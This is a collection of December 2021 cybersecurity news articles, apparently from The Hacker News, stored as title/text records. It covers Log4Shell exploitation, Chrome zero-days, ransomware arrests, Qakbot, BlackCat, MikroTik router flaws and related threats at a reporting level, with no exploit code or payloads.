launch ransomware, or conduct other malicious activity.“\n\nFurthermore, CISA has also added the Log4j vulnerability to its Known Exploited Vulnerabilities Catalog, giving federal agencies a deadline of December 24 to incorporate patches for the flaw. Similar advisories have been previously issued by government agencies in Austria, Canada, New Zealand, and the U.K.\n\nSo far, active exploitation attempts recorded in the wild have involved the abuse of the flaw to rope the devices into a botnet, and drop additional payloads such as Cobalt Strike and cryptocurrency miners. Cybersecurity firm Sophos said it also observed attempts to exfiltrate Amazon Web Services (AWS) keys and other private data from compromised systems.\nIn a sign that the threat is rapidly evolving, Check Point researchers cautioned of 60 new variations of the original Log4j exploit being introduced in less than 24 hours, adding it blocked more than 1,272,000 intrusion attempts, with 46% of the attacks staged by known malicious groups. The Israeli security company dubbed Log4Shell a “true cyber pandemic.“\nA vast majority of the exploitation attempts against Log4Shell have originated in Russia (4,275), based on telemetry data from Kaspersky, followed by Brazil (2,493), the U.S. (1,746), Germany (1,336), Mexico (1,177), Italy (1,094), France (1,008), and Iran (976). In comparison, only 351 attempts were mounted from China.\n\nThe mutating nature of the exploit notwithstanding, the prevalence of the tool across a multitude of sectors has also put industrial control systems and operational technology environments that power critical infrastructure on high alert.\n“Log4j is used heavily in external/internet-facing and internal applications which manage and control industrial processes leaving many industrial operations like electric power, water, food and beverage, manufacturing, and others exposed to potential remote exploitation and access,“ said Sergio Caltagirone, vice president of threat intelligence at Dragos. “It’s important to prioritize external and internet-facing applications over internal applications due to their internet exposure, although both are vulnerable.“\nThe development once again highlights how major security vulnerabilities identified in open-source software could spark a serious threat to organizations that include such off-the-shelf dependencies in their IT systems. The broad reach aside, Log4Shell is all the more concerning for its relative ease of exploitation, laying the foundation for future ransomware attacks.\n“To be clear, this vulnerability poses a severe risk,“ CISA Director Jen Easterly said. “This vulnerability, which is being widely exploited by a growing set of threat actors, presents an urgent challenge to network defenders given its broad use. Vendors should also be communicating with their customers to ensure end users know that their product contains this vulnerability and should prioritize software updates.“\n\n\nFound this article interesting?

'text': 'Europol, the European Union’s premier law enforcement agency, has announced the arrest of a third Romanian national for his role as a ransomware affiliate suspected of hacking high-profile organizations and companies and stealing large volumes of sensitive data.\nThe 41-year-old unnamed individual was apprehended Monday morning at his home in Craiova, Romania, by the Romanian Directorate for Investigating Organized Crime and Terrorism (DIICOT) following a joint investigation in collaboration with the U.S. Federal Bureau of Investigation (FBI).\nIt’s not currently known which ransomware gang the suspect was working with, but the development comes a little over a month after Romanian authorities arrested two affiliates of the REvil ransomware family, who are believed to have orchestrated no fewer than 5,000 ransomware attacks and extorted close to $600,000 from victims.\n\nAffiliates play a key role in the subscription-based ransomware-as-a-service (RaaS) business models, and are chiefly responsible for renting the toolset and the backend infrastructure from the core developers and launching their own attacks against a potential list of targets.\nThese actors are often recruited by the ransomware operators on underground forums, where their warez are advertised to Russian-speaking users or English speakers with a Russian-speaking guarantor, but only after vetting their technical skills. The affiliates also earn a large share of each successful ransom payment, ranging anywhere between 65% and 90%, making it an increasingly successful and profitable enterprise for cybercriminals.\nAccording to Europol, the suspect is said to have targeted a large Romanian IT company delivering services to clients in the retail, energy and utilities sectors. Subsequently, the affiliate deployed ransomware and siphoned troves of data from the company’s customers located in the country and beyond, before proceeding to encrypting the files.\n“The information stolen included the companies’ financial information, personal information about employees, customers’ details and other important documents,“ Europol said in a statement. “The suspect would then ask for a sizeable ransom payment in cryptocurrency, threatening to leak the stolen data on cybercrime forums should his demands not be met.“\nUkraine Arrests 51 For Selling Stolen Data of 300 Million People\nIn a separate law enforcement action, the Cyberpolice Department of the National Police of Ukraine announced it had arrested 51 people in connection with illegally possessing about 100 databases containing personal information of more than 300 million citizens of Ukraine, Europe, and the U.S.\n\nThe databases also included “confidential information on financial and economic activities of individuals and legal entities, information about customers of banking and commercial institutions, authorization data on emails, social networks, online stores and more,“ the department said in a statement.\n\nAs part of the operation codenamed “DATA,“ the officials conducted a total of 117 searchers in various parts of the country and shut down an unnamed website that offered the stolen data — such as telephone numbers, names, and, in some cases, vehicle registration information — for sale.\n“More than 30 channels of illegal dissemination of information were blocked during the investigation,“ the agency noted, with Serhiy Lypka, head of the Department for Combating Crimes in the Field of Computer Systems, stating “the cost of databases ranged from 500 to 50,000 hryvnias — depending on its content and commercial value.“\n\n\nFound this article interesting?

An anonymous researcher has been credited with discovering and reporting the flaw.\nAs it stands, it’s not known how the weakness is being abused in real-world attacks, but the internet giant issued a terse statement that said, “it’s aware of reports that an exploit for CVE-2021-4102 exists in the wild.“ This is done so in an attempt to ensure that a majority of users are updated with a fix and prevent further exploitation by other threat actors.\n\nCVE-2021-4102 is the second use-after-free vulnerability in V8 the company has remediated in less than three months following reports of active exploitation, with the previous vulnerability CVE-2021-37975, also reported by an anonymous researcher, plugged in an update it shipped on September 30. It’s not immediately clear if the two flaws bear any relation to one another.\nWith this latest update, Google has addressed a record 17 zero-days in Chrome this year alone —\nCVE-2021-21148 - Heap buffer overflow in V8CVE-2021-21166 - Object recycle issue in audioCVE-2021-21193 - Use-after-free in BlinkCVE-2021-21206 - Use-after-free in BlinkCVE-2021-21220 - Insufficient validation of untrusted input in V8 for x86_64CVE-2021-21224 - Type confusion in V8CVE-2021-30551 - Type confusion in V8CVE-2021-30554 - Use-after-free in WebGLCVE-2021-30563 - Type confusion in V8CVE-2021-30632 - Out of bounds write in V8CVE-2021-30633 - Use-after-free in Indexed DB APICVE-2021-37973 - Use-after-free in Portals CVE-2021-37975 - Use-after-free in V8CVE-2021-37976 - Information leak in coreCVE-2021-38000 - Insufficient validation of untrusted input in IntentsCVE-2021-38003 - Inappropriate implementation in V8\n\nChrome users are recommended to update to the latest version (96.0.4664.110) for Windows, Mac, and Linux by heading to Settings > Help > ’About Google Chrome’ to mitigate any potential risk of active exploitation.\n\n\nFound this article interesting?

{'title': 'Karakurt: A New Emerging Data Theft and Cyber Extortion Hacking Group',
'text': 'A previously undocumented, financially motivated threat group has been connected to a string of data theft and extortion attacks on over 40 entities between September and November 2021.\nThe hacker collective, which goes by the self-proclaimed name Karakurt and was first identified in June 2021, is capable of modifying its tactics and techniques to adapt to the targeted environment, Accenture’s Cyber Investigations, Forensics and Response (CIFR) team said in a report published on December 10.\n“The threat group is financially motivated, opportunistic in nature, and so far, appears to target smaller companies or corporate subsidiaries versus the alternative big game hunting approach,“ the CIFR team said. “Based on intrusion analysis to date, the threat group focuses solely on data exfiltration and subsequent extortion, rather than the more destructive ransomware deployment.“\n\n95% of the known victims are based in North America, while the remaining 5% are in Europe. Professional services, healthcare, industrial, retail, technology, and entertainment verticals have been the most targeted.\nThe goal, the researchers noted, is to avoid drawing attention to its malicious activities as much as possible by relying on living off the land (LotL) techniques, wherein the attackers abuse legitimate software and functions available in a system such as operating system components or installed software to move laterally and exfiltrate data, as opposed to deploying post-exploitation tools like Cobalt Strike.\n\nWith ransomware attacks gaining worldwide attention in the wake of incidents aimed at Colonial Pipeline, JBS, and Kaseya as well as the subsequent law enforcement actions that have caused actors like DarkSide, BlackMatter, and REvil to shutter their operations, Karakurt appears to be trying a different tack.\n\nRather than deploy ransomware after gaining initial access to victims’ internet-facing systems via legitimate VPN credentials, the actor focuses almost exclusively on data exfiltration and extortion, a move that’s less likely to bring the targets’ business activities to a standstill and yet enable Karakurt to demand a “ransom“ in return for the stolen information.\nBesides encryption data at rest wherever applicable, organizations are recommended to turn on multiple-factor authentication (MFA) to authenticate accounts, disable RDP on external-facing devices, and update the infrastructure to the latest versions to prevent adversaries from exploiting unpatched systems with publicly-known vulnerabilities.\n\n\nFound this article interesting?

{'title': 'Top 3 SaaS Security Threats for 2022',
'text': 'With 2021 drawing to a close and many closing their plans and budgets for 2022, the time has come to do a brief wrap-up of the SaaS Security challenges on the horizon.\nHere are the top 3 SaaS security posture challenges as we see them. \n1 — The Mess of Misconfiguration Management\nThe good news is that more businesses than ever are using SaaS apps such as GitHub, Microsoft 365, Salesforce, Slack, SuccessFactors, Zoom, and many others, to enable employees to maintain productivity under the most challenging of circumstances. As for the bad news, many companies are having a hard time adequately addressing the ever-changing security risks of each app. \nThis challenge begins with a simple miscalculation—businesses are tasking security teams to ensure that the security configurations for each app are set correctly. \nWhile that may seem like the logical choice, these apps are like snowflakes, no two are the same, including their specific settings and configurations. This is exacerbated by SaaS environments that contain hundreds of apps. Add it all up and what’s left is an unrealistic burden being placed squarely on the shoulders of security teams. \nThese teams do not have the superhuman computing power to be able to monitor thousands of configurations and user permissions daily to secure the organization’s SaaS app stack, without a SaaS Security Posture Management (SSPM) solution. \nLearn more about SaaS Security Posture Management \n2 — Users, Privileged Users Everywhere\nOne only has to consider the typical employee, untrained in security measures, and how their access or privileges increase the risk of sensitive data being stolen, exposed, or compromised. The ease with which SaaS apps can be deployed and adopted is remarkable — and with employees working everywhere, the need for strengthened governance for privileged access is clear. \nThis has been a long time coming; the shifts in the working climate have further accelerated the process, yet SaaS adoption has been gaining ground for years. Organizations today need the capability to reduce risk caused by over-privileged user access and streamline user-to-app access audit reviews by gaining consolidated visibility of a person’s accounts, permissions, and privileged activities across their SaaS estate. \nLearn more about managing and monitoring privileged user access in your SaaS environment \n3 — Ransomware through SaaS\nWhen threat actors decide to target your SaaS applications, they can use more basic to the more sophisticated methods. Similar to what Kevin Mitnick in his RansomCloud video, a traditional line of a business email account attack through a SaaS application follows this pattern:\nCybercriminal sends an OAuth application phishing email.User clicks on the link. User signs into their account.Application requests the user to allow access to read email and other functionalities.User clicks “accept.“This creates an OAuth token which is sent directly to the cybercriminal.The OAuth token gives the cybercriminal control over the cloud-based email or drive, etc. (based on the scopes of what access was given.)Cybercriminal uses OAuth to access email or drive, etc., and encrypt it.The next time the user signs into their email or drive etc., they will find their info encrypted. The ransomware attack has deployed.The user receives a message that their email has been encrypted and they need to pay to retrieve access. \nThis is a specific type of attack through SaaS; however, other malicious attacks through OAuth applications can occur in an organization’s environment. \nFinal Thoughts\nGartner named this domain as one of the “4 Must-Have Technologies That Made the Gartner Hype Cycle for Cloud Security, 2021. \nWith a SaaS Security Posture Management (SSPM) platform, like Adaptive Shield, you can prevent such attacks and automate the prioritization and remediation processes to fix any misconfiguration issues as they happen. \n\n\nFound this article interesting?

{'title': 'Microsoft Details Building Blocks of Widely Active Qakbot Banking Trojan',
'text': 'Infection chains associated with the multi-purpose Qakbot malware have been broken down into “distinct building blocks,“ an effort that Microsoft said will help to proactively detect and block the threat in an effective manner.\nThe Microsoft 365 Defender Threat Intelligence Team dubbed Qakbot a “customizable chameleon that adapts to suit the needs of the multiple threat actor groups that utilize it.“\nQakbot is believed to be the creation of a financially motivated cybercriminal threat group known as Gold Lagoon. It is a prevalent information-stealing malware that, in recent years, has become a precursor to many critical and widespread ransomware attacks, offering a malware installation-as-a-service that enables many campaigns.\n\nFirst discovered in 2007, the modular malware — like TrickBot — has evolved from its early roots as a banking trojan to become a Swiss Army knife capable of data exfiltration and acting as a delivery mechanism for the second stage payloads, including ransomware. Also notable is its tactic of hijacking victims’ legitimate email threads from Outlook clients via an Email Collector component and using those threads as phishing lures to infect other machines.\n\n“Compromising IMAP services and email service providers (ESPs), or hijacking email threads allows attackers to leverage the trust a potential victim has in people they have corresponded with before, and it also allows for the impersonation of a compromised organization,“ Trend Micro researchers Ian Kenefick and Vladimir Kropotov detailed last month. “Indeed, intended targets will be much more likely to open emails from a recognized sender.“\nQakbot activity tracked by the cybersecurity firm over a seven month period between March 25, 2021, and October 25, 2021, show that the U.S., Japan, Germany, India, Taiwan, Italy, South Korea, Turkey, Spain, and France are the top targeted countries, with the intrusions primarily striking telecommunications, technology, and education sectors.\nMore recently, spam campaigns have resulted in the deployment of a new loader called SQUIRRELWAFFLE that enables the attackers to gain an initial foothold into enterprise networks and drop malicious payloads, such as Qakbot and Cobalt Strike, on infected systems.\n\nNow according to Microsoft, attack chains involving Qakbot comprise of several building blocks that chart the various stages of the compromise, right from the methods adopted to distribute the malware — links, attachments, or embedded images — before carrying out an array of post-exploitation activities such as credential theft, email exfiltration, lateral movement, and the deployment of Cobalt Strike beacons and ransomware.\nThe Redmond-based company noted that Qakbot-related emails sent by the attackers may, at times, come with a ZIP archive file attachment that includes a spreadsheet containing Excel 4.0 macros, an initial access vector that’s widely abused in phishing attacks. Regardless of the mechanism employed to deliver the malware, the campaigns have in common their use of malicious Excel 4.0 macros.\n\nWhile macros are turned off by default in Microsoft Office, recipients of the email messages are prompted to enable the macro to view the document’s actual content. This triggers the next phase of the onslaught to download the malicious payloads from one or more attacker-controlled domains.\nMore often than not, Qakbot is just the first step in what’s part of a larger attack, with the threat actors using the initial foothold facilitated by the malware to install additional payloads or sell the access to the highest bidder on underground forums who can then leverage it for their own ends. In June 2021, enterprise security company Proofpoint revealed how ransomware actors are increasingly shifting from using email messages as an intrusion route to purchasing access from cybercriminal enterprises that have already infiltrated major entities.\n“Qakbot’s modularity and flexibility could pose a challenge for security analysts and defenders because concurrent Qakbot campaigns could look strikingly different on each affected device, significantly impacting how these defenders respond to such attacks,“ the researchers said. “Therefore, a deeper understanding of Qakbot is paramount in building a comprehensive and coordinated defense strategy against it.“\n\n\nFound this article interesting?

{'title': 'Apache Log4j Vulnerability — Log4Shell — Widely Under Active Attack',
'text': 'Threat actors are actively weaponizing unpatched servers affected by the newly identified “Log4Shell“ vulnerability in Log4j to install cryptocurrency miners, Cobalt Strike, and recruit the devices into a botnet, even as telemetry signs point to exploitation of the flaw nine days before it even came to light.\nNetlab, the networking security division of Chinese tech giant Qihoo 360, disclosed threats such as Mirai and Muhstik (aka Tsunami) are setting their sights on vulnerable systems to spread the infection and grow its computing power to orchestrate distributed denial-of-service (DDoS) attacks with the goal of overwhelming a target and rendering it unusable. Muhstik was previously spotted exploiting a critical security flaw in Atlassian Confluence (CVE-2021-26084, CVSS score: 9.8) earlier this September.\n\nThe latest development comes as it has emerged that the vulnerability has been under attack for at least more than a week prior to its public disclosure on December 10, and companies like Auvik, ConnectWise Manage, and N-able have confirmed their services are impacted, widening the scope of the flaw’s reach to more manufacturers.\n“Earliest evidence we’ve found so far of [the] Log4j exploit is 2021-12-01 04:36:50 UTC,“ Cloudflare CEO Matthew Prince tweeted Sunday. “That suggests it was in the wild at least nine days before publicly disclosed. However, don’t see evidence of mass exploitation until after public disclosure.“ Cisco Talos, in an independent report, said it observed attacker activity related to the flaw beginning December 2.\n\nTracked CVE-2021-44228 (CVSS score: 10.0), the flaw concerns a case of remote code execution in Log4j, a Java-based open-source Apache logging framework broadly used in enterprise environments to record events and messages generated by software applications.\nAll that is required of an adversary to leverage the vulnerability is send a specially crafted string containing the malicious code that gets logged by Log4j version 2.0 or higher, effectively enabling the threat actor to load arbitrary code from an attacker-controlled domain on a susceptible server and take over control.\n\n“The bulk of attacks that Microsoft has observed at this time have been related to mass scanning by attackers attempting to thumbprint vulnerable systems, as well as scanning by security companies and researchers,“ Microsoft 365 Defender Threat Intelligence Team said in an analysis. “Based on the nature of the vulnerability, once the attacker has full access and control of an application, they can perform a myriad of objectives.“\nIn particular, the Redmond-based tech giant said it detected a wealth of malicious activities, including installing Cobalt Strike to enable credential theft and lateral movement, deploying coin miners, and exfiltrating data from the compromised machines.\nThe situation has also left companies scrambling to roll out fixes for the bug. Network security vendor SonicWall, in an advisory, revealed its Email Security solution is affected, stating it’s working to release a fix for the issue while it continues to investigate the rest of its lineup. Virtualization technology provider VMware, likewise, warned of “exploitation attempts in the wild,“ adding that it’s pushing out patches to a number of its products.\nIf anything, incidents like these illustrate how a single flaw, when uncovered in packages incorporated in a lot of software, can have ripple effects, acting as a channel for further attacks and posing a critical risk to affected systems. “All threat actors need to trigger an attack is one line of text,“ Huntress Labs Senior Security Researcher John Hammond said. “There’s no obvious target for this vulnerability — hackers are taking a spray-and-pray approach to wreak havoc.“\n\n\nFound this article interesting?

{'title': 'Extremely Critical Log4J Vulnerability Leaves Much of the Internet at Risk',
'text': 'The Apache Software Foundation has released fixes to contain an actively exploited zero-day vulnerability affecting the widely-used Apache Log4j Java-based logging library that could be weaponized to execute malicious code and allow a complete takeover of vulnerable systems.\nTracked as CVE-2021-44228 and by the monikers Log4Shell or LogJam, the issue concerns a case of unauthenticated, remote code execution (RCE) on any application that uses the open-source utility and affects versions Log4j 2.0-beta9 up to 2.14.1. The bug has scored a perfect 10 on 10 in the CVSS rating system, indicative of the severity of the issue.\n“An attacker who can control log messages or log message parameters can execute arbitrary code loaded from LDAP servers when message lookup substitution is enabled,“ the Apache Foundation said in an advisory. “From Log4j 2.15.0, this behavior has been disabled by default.“\n\nExploitation can be achieved by a single string of text, which can trigger an application to reach out to a malicious external host if it is logged via the vulnerable instance of Log4j, effectively granting the adversary the ability to retrieve a payload from a remote server and execute it locally. The project maintainers credited Chen Zhaojun of Alibaba Cloud Security Team with discovering the issue.\nLog4j is used as a logging package in a variety of different popular software by a number of manufacturers, including Amazon, Apple iCloud, Cisco, Cloudflare, ElasticSearch, Red Hat, Steam, Tesla, Twitter, and video games such as Minecraft. In the case of the latter, attackers have been able to gain RCE on Minecraft Servers by simply pasting a specially crafted message into the chat box.\nA huge attack surface\n“The Apache Log4j zero-day vulnerability is probably the most critical vulnerability we have seen this year,“ said Bharat Jogi, senior manager of vulnerabilities and signatures at Qualys. “Log4j is a ubiquitous library used by millions of Java applications for logging error messages. This vulnerability is trivial to exploit.“\nCybersecurity firms BitDefender, Cisco Talos, Huntress Labs, and Sonatype have all confirmed evidence of mass scanning of affected applications in the wild for vulnerable servers and attacks registered against their honeypot networks following the availability of a proof-of-concept (PoC) exploit. “This is a low skilled attack that is extremely simple to execute,“ Sonatype’s Ilkka Turunen said.\n\nGreyNoise, likening the flaw to Shellshock, said it observed malicious activity targeting the vulnerability commencing on December 9, 2021. Web infrastructure company Cloudflare noted that it blocked roughly 20,000 exploit requests per minute around 6:00 p.m. UTC on Friday, with most of the exploitation attempts originating from Canada, the U.S., Netherlands, France, and the U.K.\n\nGiven the ease of exploitation and prevalence of Log4j in enterprise IT and DevOps, in-the-wild attacks aimed at susceptible servers are expected to ramp up in the coming days, making it imperative to address the flaw immediately. Israeli cybersecurity firm Cybereason has also released a fix called “Logout4Shell“ that closes out the shortcoming by using the vulnerability itself to reconfigure the logger and prevent further exploitation of the attack.\n“This Log4j (CVE-2021-44228) vulnerability is extremely bad. Millions of applications use Log4j for logging, and all the attacker needs to do is get the app to log a special string,“ Security expert Marcus Hutchins said in a tweet.\n\n\nFound this article interesting?

'text': 'Details have emerged about what’s the first Rust-language-based ransomware strain spotted in the wild that has already amassed “some victims from different countries“ since its launch last month.\nThe ransomware, dubbed BlackCat, was disclosed by MalwareHunterTeam. “Victims can pay with Bitcoin or Monero,“ the researchers said in a series of tweets detailing the file-encrypting malware. “Also looks they are giving credentials to intermediaries“ for negotiations.\nBlackCat, akin to many other variants that have sprung before it, operates as a ransomware-as-a-service (RaaS), wherein the core developers recruit affiliates to breach corporate environments and encrypt files, but not before stealing the said documents in a double extortion scheme to pressure the targets into paying the requested amount or risk exposure of the stolen data should the companies refuse to pay up.\n\nSecurity researcher Michael Gillespie called it a “very sophisticated ransomware.“\nSouth Korean cybersecurity company S2W, in a separate analysis of BlackCat, said that the ransomware conducts its malicious actions by referring to an internal configuration like other RaaS programs, calling out its similarities with BlackMatter, another ransomware that emerged from the ashes of DarkSide in July only to sunset its activities in early November.\n\nWhile it’s typical of ransomware groups to go underground, regroup, and resurface under a new name, the researchers cautioned against calling BlackCat a BlackMatter rebrand, citing differences in the programming language used (Rust vs. C++), the myriad execution options, and the dark web infrastructure maintained by the actor.\nBlackCat, starting December 4, 2021, has been advertised on Russian-language underground markets like XSS and Exploit under the username “alphv“ and as “ransom“ on the RAMP forum in a bid to recruit other participants, including penetration testers, and join what it called “the next generation of ransomware.“\nThe ransomware actor is also said to be operating five onion domains, three of which function as the group’s negotiation site, with the rest categorized as an “Alphv“ public leak site and a private leak site. Only two victims have been identified so far, suggesting that the nascent ransomware is being actively deployed against companies in real-world attacks.\n“After information about the BlackCat ransomware and Alphv leak site was revealed on Twitter, they deleted all information of both two victims and added their warning message on Alphv leak site,“ S2W researchers noted.\n\nThe development signals a growing trend where threat actors are adopting lesser-known programming languages such as Dlang, Go, Nim, and Rust, to bypass security protections, evade analysis, and hamper reverse engineering efforts.\nRust is also gaining traction for its ability to achieve high-performance compared to that of languages such as C and C++, while simultaneously offering memory safety guarantees that could be leveraged to create malware that’s less susceptible to exploitation and render them powerless.\n\n\nFound this article interesting?

'text': 'Russia has stepped up its censorship efforts in the country by fully blocking access to the Tor web anonymity service, coinciding with the ban of six virtual private network (VPN) operators, as the government continues its efforts to control the internet and crack down on attempts to circumvent locally imposed web restrictions.\nThe Federal Service for Supervision of Communications, Information Technology and Mass Media, also known as Roskomnadzor, the watchdog responsible for monitoring, controlling and censoring Russian mass media, announced the block, accusing it of enabling access to illegal content, Reuters reported this week.\n\nRussia accounts for 15% of all Tor users, with more than 310,000 daily users, second only to the U.S.\nTor, short for The Onion Router, enables users to automatically encrypt and reroute their web requests through a network of Tor relays for anonymizing network traffic, as well as help bypass censorship and protect their identities from the internet service providers and the websites they visit.\nConfirming the blockade, the Tor Project maintainers said, “the Russian government has officially blocked our main website in Russia,“ adding, “Since December 1st, some Internet providers in Russia have started to block access to Tor.“ The nonprofit organization has responded by creating a mirror site that is still reachable in the country.\n“As this instance of censorship limits direct access to our website, malicious actors could start phishing users with fake Tor Browsers or spreading disinformation about Tor,“ the maintainers added.\nTor is not the only entity to have come under the scrutiny of Russia’s Internet censors. Apple, which introduced an iCloud Private Relay feature with iOS 15 and macOS Monterey, has since dropped the functionality for its users in Russia, citing local regulations. The setting is designed to keep users’ internet traffic private and away from the eyes of the network provider (or the ISP) and the websites by routing the requests through two separate, secure internet relays.\n\nThis encrypted mode of communication effectively shields the destination information (i.e., the website) from the network provider, while both the second relay — which decrypts the name of the requested website and connects the user to the site — and the website itself are prevented from identifying the user, creating a simplified version of Tor.\nThe development also comes as the state regulator added Betternet, Lantern, X-VPN, Cloudflare WARP, Tachyon VPN, and PrivateTunnel to the list of outlawed VPN services, alongside VyprVPN and Opera VPN that were banned in June 2021.

'text': 'At least 300,000 IP addresses associated with MikroTik devices have been found vulnerable to multiple remotely exploitable security vulnerabilities that have since been patched by the popular supplier of routers and wireless ISP devices.\nThe most affected devices are located in China, Brazil, Russia, Italy, Indonesia, with the U.S. coming in at number eight, cybersecurity firm Eclypsium said in a report shared with The Hacker News.\n“These devices are both powerful, [and] often highly vulnerable,“ the researchers noted. “This has made MikroTik devices a favorite among threat actors who have commandeered the devices for everything from DDoS attacks, command-and-control (aka ’C2’), traffic tunneling, and more.“\nMikroTik devices are an enticing target not least because there are more than two million of them deployed worldwide, posing a huge attack surface that can be leveraged by threat actors to mount an array of intrusions.\n\nIndeed, earlier this September, reports emerged of a new botnet named Mēris that staged a record-breaking distributed denial-of-service (DDoS) attack against Russian internet company Yandex by using network devices from Mikrotik as an attack vector by exploiting a now-addressed security vulnerability in the operating system (CVE-2018-14847).\nThis is not the first time MikroTik routers have been weaponized in real world attacks. In 2018, cybersecurity firm Trustwave discovered at least three massive malware campaigns exploiting hundreds of thousands of unpatched MikroTik routers to secretly install cryptocurrency miners on computers connected to them. The same year, China’s Netlab 360 reported that thousands of vulnerable MikroTik routers had been surreptitiously corralled into a botnet by leveraging CVE-2018-14847 to eavesdrop on network traffic.\n\nCVE-2018-14847 is also among the four unaddressed vulnerabilities discovered over the last three years and which could enable full takeover of MikroTik devices -\nCVE-2019-3977 (CVSS score: 7.5) - MikroTik RouterOS insufficient validation of upgrade package’s origin, allowing a reset of all usernames and passwordsCVE-2019-3978 (CVSS score: 7.5) - MikroTik RouterOS insufficient protections of a critical resource, leading to cache poisoningCVE-2018-14847 (CVSS score: 9.1) - MikroTik RouterOS directory traversal vulnerability in the WinBox interfaceCVE-2018-7445 (CVSS score: 9.8) - MikroTik RouterOS SMB buffer overflow vulnerability\nIn addition, Eclypsium researchers said they found 20,000 exposed MikroTik devices that injected cryptocurrency mining scripts into web pages that users visited.\n\n“The ability for compromised routers to inject malicious content, tunnel, copy, or reroute traffic can be used in a variety of highly damaging ways,“ the researchers said. “DNS poisoning could redirect a remote worker’s connection to a malicious website or introduce a machine-the-middle.“\n\n“An attacker could use well-known techniques and tools to potentially capture sensitive information such as stealing MFA credentials from a remote user using SMS over WiFi. As with previous attacks, enterprise traffic could be tunneled to another location or malicious content injected into valid traffic,“ the researchers added.\nMikroTik routers are far from the only devices to have been co-opted into a botnet. Researchers from Fortinet this week disclosed how the Moobot botnet is leveraging a known remote code execution (RCE) vulnerability in Hikvision video surveillance products (CVE-2021-36260) to grow its network, and use the compromised devices to launch distributed denial-of-service (DDoS) attacks.\nIn a separate report, the enterprise cybersecurity firm said that the operators of a botnet known as Manga aka Dark Mirai are actively abusing a recently disclosed post-authenticated remote code execution vulnerability (CVE-2021-41653) to hijack TP-Link routers and co-opt the appliances to their network of infected devices.\nUpdate\nIn a statement shared with The Hacker News, the Latvian company said that “there are no new vulnerabilities in RouterOS,“ while stressing that keeping the operating system up to date is an “essential step to avoid all kinds of vulnerabilities.“\n“Unfortunately, closing the old vulnerability does not immediately protect the affected routers. We don’t have an illegal backdoor to change the user’s password and check their firewall or configuration. These steps must be done by the users themselves,“ the company explained.\n“We try our best to reach out to all users of RouterOS and remind them to do software upgrades, use secure passwords, check their firewall to restrict remote access to unfamiliar parties, and look for unusual scripts. Unfortunately, many users have never been in contact with MikroTik and are not actively monitoring their devices. We cooperate with various institutions worldwide to look for other solutions as well.“\n\n\n\nFound this article interesting?

'text': 'It is a time when many are thinking of their families and loved ones, time off work, and gift-giving – the holidays. However, while many have their minds outside the realm of work during the holiday season, often, this is when attackers plan their most sinister attacks. \nSo how can you take precautions to protect your organization during these times?\nWhy holidays put your company at risk of cyberattack\n \nAttackers today do not have a soft spot for businesses and give companies a break at any time of the year, especially not during holidays. On the contrary, any time of the year where companies may be less prepared to fend off a cyberattack is an opportunity for successful compromise. As a result, the holidays put your company at a higher risk of cyberattack. \nMost end-users do not think about cybersecurity when surfing the web or receiving emails with holiday deals during the season. As a result, many let their guard down to a certain degree and become preoccupied and distracted more than usual. Increased distraction from the end-user perspective and less scrutiny of emails and websites where holiday discounts and offers may be displayed can provide the perfect opportunity for attackers using phishing scams or malicious advertisements.\nAdditionally, IT operations and SecOps teams may be short-staffed with staff out on vacation during the holidays. It creates a situation of increased risk to business-critical data with potentially fewer resources to help mitigate risks and breaches if they happen.\nEarlier this year, the FBI and Cybersecurity & Infrastructure Security Agency released a general alert for increased vigilance for ransomware attacks during holidays. You can read the warning here: Ransomware Awareness for Holidays and Weekends | CISA. In part, it states:\n“The Federal Bureau of Investigation (FBI) and the Cybersecurity and Infrastructure Security Agency (CISA) have observed an increase in highly impactful ransomware attacks occurring on holidays and weekends—when offices are normally closed—in the United States, as recently as the Fourth of July holiday in 2021.“\nWith upcoming holidays in the U.S. and worldwide, organizations must remain vigilant and on guard to protect against many forms of attack. Let’s look at the following common cybersecurity risks during this holiday season:\nRansomwarePhishing emailData breachDistributed Denial of Service (DDoS)Breached passwords\n1 - Ransomware\nRansomware is by far one of the most sinister threats to organizations and their data today. With the increased threat of successful phishing attacks and visits to malicious websites, the chances of your business getting infected with ransomware drastically increase.\nThreat actors may entice users to click on a malicious link in a phishing email or perform a drive-by attack using malicious web code on a hijacked website. Either way, it can be a gateway for ransomware infection. Note the following ransomware attacks over a holiday:\nMemorial Day – ransomware attack on meat processing giant JBS. Fourth of July – ransomware attack on IT management software company Kaseya\nTo protect against ransomware, organizations must put the appropriate security measures in place, including:\nPhishing email filteringStrong password policies and breached password protectionLeast privilege accessMicro-segmentationApplication whitelistingOther security measures\nIs ransomware costly to businesses? According to the IBM Cost of a Data Breach 2021 report, ransomware is highly costly to your business:\nRansomware attacks cost an average of $4.62 million, more expensive than the average data breach ($4.24 million). These costs included escalation, notification, lost business, and response costs, but did not include the cost of the ransom. Malicious attacks that destroyed data in destructive wiper-style attacks cost an average of $4.69 million. The percentage of companies where ransomware was a factor in the breach was 7.8%.\n2 - Phishing email\nOne of the easy ways that attackers can compromise environments is by using phishing emails. Phishing emails masquerade as communications from legitimate companies. Attackers have become proficient in making phishing emails appear legitimate, from the logos, wording, images, and other styling associated with the email. \nWithout appropriate security protections in place, an end-user simply must click on the malicious link, and the damage begins. For example, suppose there are no zero-trust or micro-segmentation boundaries in place. In that case, the ransomware can freely crawl across the network and infect anything on which the user has “write“ or “modify“ permissions.\nDuring the holiday season, end-users are generally “click-happy“ and may not scrutinize emails and other communications as closely. As a result, attackers may use the flood of email communications to infiltrate the organization’s perimeter with a phishing attack. \nAgain, cybersecurity basics come into play to protect against phishing emails, like the protections listed for ransomware:\nPhishing email filteringEnd-user cybersecurity trainingDisallowed attachments\n3 - Data breach\nData breaches are a critical cybersecurity threat for organizations worldwide. The implications and financial fall-out from a data breach event can be tremendous. The IBM Cost of a Data Breach Report 2021 cites:\nData breach costs increased significantly year-over year from the 2020 report to the 2021 report, increasing from $3.86 million in 2020 to $4.24 million in 2021. The increase of $0.38 million ($380,000) represents a 9.8% increase. This compares to a decrease of 1.5% from the 2019 to 2020 report year. The cost of a data breach has increase by 11.9% since 2015.\nData breaches can occur intentionally, unintentionally, or due to malicious cyberattacks. For example, an employee may accidentally share data they shouldn’t share or do this intentionally. In the holiday season, employees are more distracted with holiday plans or other activities and, by extension, more apt to expose data. Additionally, with the increased ransomware threat, the list of modern ransomware variants threatening data leaks is growing. \nIt includes:\nAKOAVADDONBABUK LOCKERCLOPCONTICUBADARKSIDEDOPPELPAYMEREGREGOREVERESTLOCKBITMAZEMESPINOZAMOUNT LOCKERNEFILIMNEMTYREVIL\n \n4 - Distributed Denial of Service (DDoS) attacks\nAnother threat for businesses around the holidays is Distributed Denial of 